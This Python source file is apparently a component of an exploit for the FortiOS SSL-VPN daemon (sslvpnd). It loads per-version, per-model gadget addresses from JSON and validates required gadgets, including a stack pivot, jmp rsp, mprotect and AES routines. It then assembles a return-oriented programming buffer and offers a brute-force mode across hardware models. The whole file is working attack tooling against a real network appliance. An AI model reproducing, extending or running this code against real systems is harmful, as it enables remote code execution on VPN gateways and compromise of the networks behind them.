import json
import struct

#
# We avoid he use of hard-coded stack addresses so that porting this exploit to
# other versions of FortiOS doesn't get hindered by data-dependent bugs. We simply hard-code
# function addresses taken from the GOT of sslvpnd and then do things the hard way to calculate
# the data addresses we need.
#

#
# Handy dandy class to simplify ROP buffer construction.
# Assumes everything is a 64-but QWORD.
#
class ROP:
    def __init__(self, filename, sw_version, hw_version, debug=False, show_summary=True):
        self.filename = filename
        self.debug = debug
        self.ropOffs = 0
        self.rop = bytearray(b"")
        self.selected_sw_version = sw_version
        self.selected_hw_version = hw_version
        self.number_of_sw_versions = 0
        self.number_of_hw_versions = 0
        self.number_of_supported_targets = 0
        self.show_summary = show_summary
        self.bad_gadgets = {}
        self.import_gadgets()

    def clear_gadget_chain(self):
        self.rop = bytearray(b"")
        self.ropOffs = 0

    def import_gadgets(self):
        print("[+] Importing gadgets from '%s'" % self.filename)
        try:
            with open(self.filename) as f:
                self.gadgets = json.loads(f.read())
        except Exception as e:
            print("error: ", e)
            exit(1)
        self.validate_imported_gadgets()

    # return an array containing all the hardware models applicable
    def hw_models(self):
        if self.selected_hw_version == None:
            return self.gadgets[self.selected_sw_version]
        else:
            return { self.selected_hw_version: self.gadgets[self.selected_sw_version][self.selected_hw_version] }

    def select_hw_version(self, hw_version):
        self.selected_hw_version = hw_version

    def validate_imported_gadgets(self):
        required_gadgets = [
            "push rdx; adc byte [rbx+0x41], bl; pop rsp; pop rbp; ret;",  # stack pivot
            "jmp rsp;",
            "jmp rax;",
            "pop rax; ret;",
            "pop rbx; ret;",
            "pop rdx; ret;",
            "pop rsi; ret;",
            "and rax, rdi; ret;",
            "add rsp, 0x18; ret;",
            "mov rdi, rax; call rbx;",
            "mprotect",
            "calloc",
            "AES_set_decrypt_key",
            "AES_cbc_encrypt"
        ]

        print("[+] Validating gadgets...")

        if len(self.gadgets) == 0:
            print("[!] Error, there's no software version information in the gadget file!")
            exit(1)
        
        for sw_version in self.gadgets:
            known_good_models = {}
            for hw_version in self.gadgets[sw_version]:
                imported_gadgets = self.gadgets[sw_version][hw_version]
                fail = False
                for required in required_gadgets:
                    g = "stack pivot" if required == 'push rdx; adc byte [rbx+0x41], bl; pop rsp; pop rbp; ret;' else required
                    if not required in imported_gadgets:
                        if self.debug: print("[!] Required gadget '%s' is missing for %s on %s. Removed." % (g, hw_version, sw_version)) 
                        fail = True
                        break

                    if required in imported_gadgets and imported_gadgets[required] == "0xdeadbeef":
                        if self.debug: print("[!] Required gadget '%s' is 0xdeadbeef for %s on %s. Removed." % (g, hw_version, sw_version))
                        fail = True
                        break
                
                if not "ret;" in imported_gadgets:
                    imported_gadgets["ret;"] = str(hex(int(imported_gadgets["pop rax; ret;"], 16) + 1))
                    #print("[+] RET gadget @ 0x%s" % imported_gadgets["ret;"])

                known_good_models[hw_version] = imported_gadgets
                self.number_of_hw_versions += 1

            if len(known_good_models) == 0:
                print("[!] No functional hardware models were defined for FortiOS '%s'. Removed." % sw_version)
                del self.gadgets[sw_version][hw_version]
            else:
                self.gadgets[sw_version] = known_good_models
                self.number_of_sw_versions += 1
        print("Selected sw version: %s" % self.selected_sw_version) 
        print("Selected hw version: %s" % self.selected_hw_version) 
        if not self.selected_sw_version in self.gadgets:
            print("[!] Error, version '%s' is not supported by this exploit." % self.selected_sw_version)
            exit(1)

        if self.selected_hw_version is not None and self.selected_hw_version not in self.gadgets[self.selected_sw_version]:
            print("[!] Error, model %s not supported for v%s" % (self.selected_hw_version, self.selected_sw_version))
            exit(1)

        print("[+] Imported %d targets:" % self.number_of_hw_versions)
        if self.show_summary is True:
            for sw_version in self.gadgets:
                hw_count_str = "[ %2s targets ]" % len(self.gadgets[sw_version])
                selected_str = " <=== %s" % ("Brute-force all models" if self.selected_hw_version is None else self.selected_hw_version)
                print("[-]   %s\t%s\t%s" % (sw_version, hw_count_str, selected_str if sw_version == self.selected_sw_version else ""))
                if self.debug:
                    for hw_version in self.gadgets[sw_version]:
                        print("[-]       %s" % hw_version)


    # concatenates the QWORD (64-bit) gadget address to the ROP buffer (aka our fake stack)
    def add_gadget(self, gadget_str, count=1):
        gadgets = self.gadgets[self.selected_sw_version][self.selected_hw_version]
    
        if gadget_str not in gadgets:
            print("[!] Error! Gadget '%s' does not exist." % gadget_str)
            exit(0)
            
        addr = gadgets[gadget_str]
        #print("[!] \"%s\" = %s" % (gadget_str, addr))
        for i in range(0,count):
            rop = self.rop
            rop += struct.pack('<Q', int(addr, 16))
            self.rop = rop
            self.ropOffs = self.ropOffs + 1

    def add_immediate(self, value, count=1):
        for i in range(0,count):
            rop = self.rop
            rop += struct.pack('<Q', value)
            self.rop = rop
            self.ropOffs = self.ropOffs + 1

    def get_address(self, gadget):
        return int(self.gadgets[self.selected_sw_version][self.selected_hw_version][gadget], 16)

    def add_padding(self, count=1):
        self.add_immediate(0x4141414141414141, count)

    # add a sequence of bytes of arbitrary length    
    def add_bytes(self, b):
        rop = self.rop
        rop += b
        self.rop = rop

    # return the number of bytes in the buffer
    def len(self):
        return len(self.rop)

    # return a bytearray containing the ROP buffer
    def bytes(self):
        return self.rop

    def get_all_gadgets(self):
        return self.gadgets

    def get_gadgets_for_sw(self, sw_version):
        return self.gadgets[sw_version] if sw_version in self.gadgets else None

    def get_gadgets_for_sw_and_hw(self, sw_version, hw_version):
        return self.gadgets[sw_version][hw_version] if (sw_version in self.gadgets and hw_version in self.gadgets[sw_version]) else None

